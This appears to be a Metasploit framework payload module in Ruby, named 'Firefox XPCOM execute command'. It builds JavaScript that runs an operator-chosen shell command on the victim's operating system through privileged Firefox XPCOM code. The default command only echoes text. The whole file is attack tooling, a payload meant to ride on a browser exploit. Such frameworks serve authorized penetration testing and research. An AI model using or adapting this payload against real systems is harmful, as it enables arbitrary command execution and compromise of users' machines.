##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/payload/firefox'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Firefox

  def initialize(info={})
    super(merge_info(info,
      'Name'          => 'Firefox XPCOM execute command',
      'Description'   => 'Runs a shell command on the OS.',
      'Author'        => ['joev'],
      'License'       => BSD_LICENSE,
      'Platform'      => 'firefox',
      'Arch'          => ARCH_FIREFOX
    ))
    register_options([
      OptString.new('CMD', [ true, "The command string to execute", 'echo HELLO; echo WORLD' ]),
    ], self.class)
  end

  def generate
    <<-EOS

      (function(){
        #{read_file_source}
        #{run_cmd_source}
        runCmd((#{JSON.unparse({:cmd => datastore['CMD']})}).cmd);
      })();

    EOS
  end
end
